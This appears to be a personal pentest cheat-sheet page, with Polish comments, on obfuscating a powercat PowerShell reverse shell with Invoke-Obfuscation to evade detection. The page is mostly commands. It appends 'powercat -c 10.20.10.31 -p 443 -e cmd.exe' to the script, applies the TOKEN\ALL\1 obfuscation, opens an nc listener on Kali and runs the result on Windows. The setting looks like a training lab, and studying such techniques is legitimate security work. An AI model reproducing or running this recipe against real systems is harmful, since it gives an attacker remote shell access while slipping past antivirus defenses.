---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Invoke-Obfuscation WIN

{% code overflow="wrap" fullWidth="true" %}
```
#ściągamy zip i odpakowujemy
 https://github.com/danielbohannon/Invoke-Obfuscation
 
 Import-Module .\Invoke-Obfuscation.psd1
 Get-Module
 
 Invoke-Obfuscation
 
 #obfuskujemy powercata, więc wpisujemy w skrypcie powercat.ps1 - czyli tym który bedziemy obfuskowywać - linijkę którą będziemy chcieli wywołać - tym sposobem gdy zmienione zostaną nazwy funkcji w skrypcie to nasza komenda też się zmieni
 #dodajemy komendę na samym końcu pliku ze skryptem powercat.ps1
 powercat -c 10.20.10.31 -p 443 -e cmd.exe
 
 #uruchamiamy obfuskację
 set scriptpath C:\Users\mike\Desktop\powercat.ps1
 
 #wybieramy opcję TOKEN
 TOKEN
 
 #wybieramy kolejne opcje
 TOKEN\ALL
 
 #i jeszcze wybieramy
 TOKEN\ALL\1
 
 #zapisujemy zaobfuskowany skrypt
 out C:\Users\mike\Desktop\obf.ps1
```
{% endcode %}

**Kali**

```
#włączamy listenera
nc -nlvp 443
```

**Win**

```
.\obf.ps1
```
